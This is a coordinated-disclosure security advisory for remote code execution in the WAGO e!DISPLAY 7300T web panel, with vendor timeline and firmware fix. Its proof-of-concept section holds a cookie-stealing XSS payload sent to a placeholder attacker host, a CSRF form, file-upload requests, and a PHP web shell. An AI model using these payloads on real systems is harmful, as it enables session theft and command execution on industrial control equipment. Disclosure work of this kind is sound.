@@ -1,0 +1,325 @@
+SEC Consult Vulnerability Lab Security Advisory < 20180711-0 >
+=======================================================================
+              title: Remote code execution via multiple attack vectors
+            product: WAGO e!DISPLAY 7300T - WP 4.3 480x272 PIO1
+ vulnerable version: FW 01 - 01.01.10(01)
+      fixed version: FW 02
+         CVE number: CVE-2018-12979, CVE-2018-12980, CVE-2018-12981
+             impact: High
+           homepage: https://www.wago.com/
+              found: 2018-04-25
+                 by: T. Weber (Office Vienna)
+                     SEC Consult Vulnerability Lab
+
+                     An integrated part of SEC Consult
+                     Europe | Asia | North America
+
+                     https://www.sec-consult.com
+
+=======================================================================
+
+Vendor description:
+-------------------
+"New ideas are the driving force behind our success WAGO is a family-owned
+company headquartered in Minden, Germany. Independently operating for three
+generations, WAGO is the global leader of spring pressure electrical
+interconnect and automation solutions. For more than 60 years, WAGO has
+developed and produced innovative products for packaging, transportation,
+process, industrial and building automation markets amongst others. Aside from
+its innovations in spring pressure connection technology, WAGO has introduced
+numerous innovations that have revolutionized industry. Further ground-breaking
+inventions include: the WAGO-I/O-SYSTEM®, TOPJOB S® and WALL-NUTS®."
+
+Source: http://www.wago.us/wago/
+
+"For visualization tasks with CODESYS 2 and CODESYS 3: WAGO's new e!DISPLAY
+7300T Web Panels help you reinforce the quality of your machinery and equipment
+with a refined design and industry-leading software. Learn more about how the
+right Web Panels make a difference.
+
+HMI components are the finishing touch for machines or systems and they have an
+overwhelming impact on purchase decisions. WAGO offers aesthetically pleasing
+HMIs that leave a lasting impression and significantly increase both the value
+and image of your machine or system. WAGO’s e!DISPLAY 7300T Web Panel is
+available in 4.3'', 5.7'', 7.0'' and 10.1'' display sizes."
+
+Source:
+http://www.wago.us/products/components-for-automation/operation-and-monitoring/web-panels-edisplay-7300t/overview/index.jsp
+
+
+Business recommendation:
+------------------------
+HMI displays are widely used in SCADA infrastructures. The link between
+their administrative (or informational) web interfaces and the users which
+access these interfaces is critical. The presented attacks demonstrate how
+simple it is to inject malicious code in order to break the security of this
+link by exploiting minimal user interaction.
+
+As a consequence a computer which is used for HMI administration should not
+provide any possibility to get compromised via malicious script code.
+
+One possible solution may be e.g.:
+   * Don't allow email clients
+   * Don't provide Internet access at all on the HMI stations
+
+SEC Consult recommends to immediately apply the available patches from the vendor.
+A thorough security review should be performed by security professionals to
+identify further potential security issues.
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) Multiple Reflected POST Cross-Site Scripting (CVE-2018-12981)
+Reflected cross site scripting vulnerabilities were identified within multiple PHP
+scripts in the admin interface. The parameter JSON input which is sent to the
+device is not sanitized sufficiently. An attacker can exploit this
+vulnerability to execute arbitrary scripts in the context of the attacked user
+and gain control over the active session.
+
+This vulnerability is present for authenticated and unauthenticated users!
+
+
+2) Stored Cross-Site Scripting (CVE-2018-12981)
+A stored cross-site scripting vulnerability was identified within the
+"PLC List" which can be configured in the web interface of the e!Display. By
+storing a payload there, an administrative or guest user can be attacked
+without tricking them to visit a malicious web site or clicking on an
+malicious link.
+
+This vulnerability is only present for authenticated users!
+
+
+3) Unrestricted File Upload and File Path Manipulation (CVE-2018-12980)
+Arbitrary files can be uploaded to the system without any check. It is even
+possible to change the location of the uploaded file on the system. As the
+web service does not run as privileged user, it is not possible to upload a
+file directly to the web root but on many other locations on the file system.
+The normal user 'user' and the administrative user 'admin' can both upload
+files to the system.
+
+
+4) Incorrect Default Permissions (CVE-2018-12979)
+Due to incorrect default permissions a file in the web root can be overwritten
+by the unprivileged 'www' user. This is the same user which is used in the
+context of the web server.
+
+
+5) Remote code execution via multiple attack vectors
+By stacking vulnerability 1)/2), 3) and 4) with this vulnerability an outside
+attacker can place a malicious script on the device in order to execute arbitrary
+commands as 'www'. This can be done by uploading a web shell or a reverse
+shell.
+
+
+Proof of concept:
+-----------------
+1) Multiple Reflected POST Cross-Site Scripting (CVE-2018-12981)
+The affected endpoints are:
+http://<IP-Address>/wbm/configtools.php
+http://<IP-Address>/wbm/login.php
+http://<IP-Address>/wbm/receive_upload.php
+
+The following request is an example for reflected XSS within 'configtools.php':
+-------------------------------------------------------------------------------
+POST /wbm/configtools.php HTTP/1.1
+Host: <IP-Address>
+Content-type: text/plain
+[...]
+
+{"sessionId":"","aDeviceParams":{"0":{"name":"firewall","parameter":["iptables","--get-xml"],"sudo":true,"multiline":true,"timeout":10000},"1":{"name":"firewall","parameter":["firewall","--is-enabled"],"sudo":true,"multiline":true,"timeout":10000,"dataId":"{DoNotParseAsXml}<img
+src=x onerror=this.src='http://$attacker:8001/?c='+document.cookie>;"}}}
+-------------------------------------------------------------------------------
+
+
+Steal the cookie via XSS and send it to http://$attacker:8001?c=<Session-ID>:
+-------------------------------------------------------------------------------
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://<IP-Address>/wbm/configtools.php" method="POST"
+enctype="text/plain">
+      <input type="hidden"
+name="&#123;"sessionId"&#58;""&#44;"aDeviceParams"&#58;&#123;"0"&#58;&#123;"name"&#58;"firewall"&#44;"parameter"&#58;&#91;"iptables"&#44;"&#45;&#45;get&#45;xml"&#93;&#44;"sudo"&#58;true&#44;"multiline"&#58;true&#44;"timeout"&#58;10000&#125;&#44;"1"&#58;&#123;"name"&#58;"firewall"&#44;"parameter"&#58;&#91;"firewall"&#44;"&#45;&#45;is&#45;enabled"&#93;&#44;"sudo"&#58;true&#44;"multiline"&#58;true&#44;"timeout"&#58;10000&#44;"dataId"&#58;"&#123;DoNotParseAsXml&#125;<img&#32;src"
+value="x&#32;onerror&#61;this&#46;src&#61;&apos;http&#58;&#47;&#47;&#46;&#46;&#46;&#58;8001&#47;&#63;c&#61;&apos;&#43;document&#46;cookie>&#59;"&#125;&#125;&#125;"
+/>
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+-------------------------------------------------------------------------------
+
+
+2) Stored Cross-Site Scripting (CVE-2018-12981)
+To exploit this vulnerability malicious code has to be placed in the "PLC List"
+by surfing to the endpoint http://<IP-Address>/app/index.html and clicking on
+the tab "Application->PLC-List". By opening one of the configurable PLCs the
+name can be changed in the box "Text:" in order to execute arbitrary script-
+code. For example:
+<img src=a onerror=alert('SEC_Consult_XSS');alert(document.cookie)>
+
+The payload can also be placed on the device by using the following POST request:
+-------------------------------------------------------------------------------
+POST /wbm/configtools.php HTTP/1.1
+Host: <IP-Address>
+[...]
+
+{"sessionId":"<Valid session-ID>
+","aDeviceParams":{"0":{"name":"config_plcselect","parameter":[2,"url=https://127.0.0.1:8001","txt=<img
+src=a
+onerror=alert('SEC_Consult_XSS');alert(document.cookie)>","vkb=enabled","mon=1"],"sudo":true}}}
+-------------------------------------------------------------------------------
+
+
+3) Unrestricted File Upload and File Path Manipulation (CVE-2018-12980)
+The file path, the file name and the file content can be manipulated in any
+way. There is no server-side check for malicious files.
+
+-------------------------------------------------------------------------------
+POST /wbm/receive_upload.php HTTP/1.1
+Host: <IP-Address>
+[...]
+Content-Type: multipart/form-data;
+boundary=---------------------------728140389204955163192597293
+
+-----------------------------728140389204955163192597293
+Content-Disposition: form-data; name="touchWbm"
+
+true
+-----------------------------728140389204955163192597293
+Content-Disposition: form-data; name="upload_type"
+
+font
+-----------------------------728140389204955163192597293
+Content-Disposition: form-data; name="session_id"
+
+<Valid session-ID>
+-----------------------------728140389204955163192597293
+Content-Disposition: form-data; name="upload_directory"
+
+/tmp/
+-----------------------------728140389204955163192597293
+Content-Disposition: form-data; name="font_file"; filename="any_file.sh"
+Content-Type: application/x-font-ttf
+
+any-content #!
+
+
+-----------------------------728140389204955163192597293--
+-------------------------------------------------------------------------------
+
+
+4) Incorrect Default Permissions (CVE-2018-12979)
+The file 'index.html' is owned by 'www' and can therefore also be overwritten
+with a web shell.
+
+www@WAGO_eDisplay:/var/www ls -la
+drwxr-xr-x    5 root     root           488 XXX 99  2018 .
+drwxr-xr-x   11 root     root           824 XXX 99  2018 ..
+lrwxrwxrwx    1 root     root            16 XXX 99  2018 app -> /var/www/WagoWBM
+-rw-r--r--    1 www      www            345 XXX 99  2018 index.html
+drwxr-xr-x    7 root     root           776 XXX 99  2018 plclist
+drwxr-xr-x    3 root     root           368 XXX 99  2018 WagoWBM
+drwxr-xr-x    2 root     root           688 XXX 99  2018 wbm
+
+
+5) Remote code execution via multiple attack vectors
+By uploading a simple PHP shell and overwriting the 'index.html' file located
+under the web root an attacker can place a web shell which is reachable without
+any authentication.
+
+-------------------------------------------------------------------------------
+POST /wbm/receive_upload.php HTTP/1.1
+Host: <IP-Address>
+[...]
+Content-Type: multipart/form-data;
+boundary=---------------------------728140389204955163192597293
+
+-----------------------------728140389204955163192597293
+Content-Disposition: form-data; name="touchWbm"
+
+true
+-----------------------------728140389204955163192597293
+Content-Disposition: form-data; name="upload_type"
+
+font
+-----------------------------728140389204955163192597293
+Content-Disposition: form-data; name="session_id"
+
+<Valid session-ID>
+-----------------------------728140389204955163192597293
+Content-Disposition: form-data; name="upload_directory"
+
+/var/www/
+-----------------------------728140389204955163192597293
+Content-Disposition: form-data; name="font_file"; filename="index.html"
+Content-Type: application/x-font-ttf
+
+<html><body>
+<form method="GET" name="SEC Consult PoC" action="">
+<input type="text" name="command"><input type="submit" value="Send"></form>
+<pre><?php if($_GET['command']){system($_GET['command']);} ?></pre>
+</body></html>
+
+
+-----------------------------728140389204955163192597293--
+-------------------------------------------------------------------------------
+
+The shell can now be reached via "http://<IP-Address>/index.html". It is also
+possible to upload a reverse-shell to the system which connects to a computer
+outside of the actual network.
+
+
+Vulnerable / tested versions:
+-----------------------------
+The following device with the firmware version has been tested:
+
+* e!DISPLAY 7300T - WP 4.3 480x272 PIO1 - 01.01.10(01)
+
+According to WAGO the following e!DISPLAY versions are vulnerable:
+762-3000 FW 01
+762-3001 FW 01
+762-3002 FW 01
+762-3003 FW 01
+
+
+Vendor contact timeline:
+------------------------
+2018-04-30: Sending encrypted advisory to VDE CERT for coordination support
+            (info@cert.vde.com)
+2018-05-02: Answer from VDE CERT that WAGO will be informed/contacted
+2018-05-08: Status update from VDE CERT
+2018-05-23: Asking for status update, no news from WAGO (via VDE CERT)
+2018-06-08: VDE CERT: WAGO fixed the vulnerabilities and firmware is in
+            testing phase
+2018-06-12: WAGO requested more time, postponing release date, asking for
+            affected & fixed versions
+2018-06-13: VDE CERT will request CVE numbers
+2018-06-17: WAGO scheduled the release for 2018-07-11
+2018-06-26: VDE CERT sends WAGO advisory draft including affected/fixed versions
+2018-07-04: VDE CERT sends final WAGO advisory incl. CVE numbers
+2018-07-10: VDE CERT publishes security notice:
+            https://cert.vde.com/de-de/advisories/vde-2018-010
+2018-07-11: SEC Consult advisory release
+
+
+Solution:
+---------
+Update the device to the latest available firmware (FW 02). For further
+information see the vendor's security notifications page:
+
+https://www.wago.com/de/automatisierungstechnik/security (German)
+
+Direct link to English WAGO advisory:
+https://www.wago.com/medias/SA-WBM-2018-004.pdf?context=bWFzdGVyfHJvb3R8MjgyNzYwfGFwcGxpY2F0aW9uL3BkZnxoMWUvaDg4LzkzNjE3NTIxOTUxMDIucGRmfDU1NmJkYjEzNDY0ZGU4OWQ1OTMyMjUwNTlmZTI0MzgwNDQ1MDY1YzU3OWRmZDk1NzYzODAwMDI3ODg1NDJlZjU
+
+
+
+Workaround:
+-----------
+Restrict network access to the device, don't allow Internet access from the
+HMI station and do not install software from untrusted sources.
+
+
+Advisory URL:
+-------------
+https://www.sec-consult.com/en/vulnerability-lab/advisories/index.html
